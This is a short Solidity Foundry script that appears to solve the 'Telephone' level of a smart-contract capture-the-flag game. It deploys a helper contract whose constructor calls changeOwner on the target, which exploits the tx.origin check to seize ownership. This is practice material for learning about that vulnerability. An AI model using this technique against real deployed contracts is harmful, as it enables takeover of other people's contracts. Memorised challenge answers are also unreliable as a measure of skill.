// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "lib-src/Script.sol";
import {console} from "lib-src/console.sol";

import {Telephone} from "src/Telephone.sol";

// forge script script/4_Telephone.s.sol --tc TelephoneSolution -vvv
contract TelephoneSolution is Script {

    Telephone public target = Telephone(0x464719e74592632835184dCB13BEC0d5d88C32F0);
    address public attacker = 0x5F49CfE21B12ffD7fE0dDd11E91b2636F86D7358;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Attacker(target);
        console.log("Attack success:", target.owner() == attacker);
        vm.stopBroadcast();
    }
}

contract Attacker {

    address public attacker = 0x5F49CfE21B12ffD7fE0dDd11E91b2636F86D7358;

    constructor(Telephone _target) {
        _target.changeOwner(attacker);
    }
}
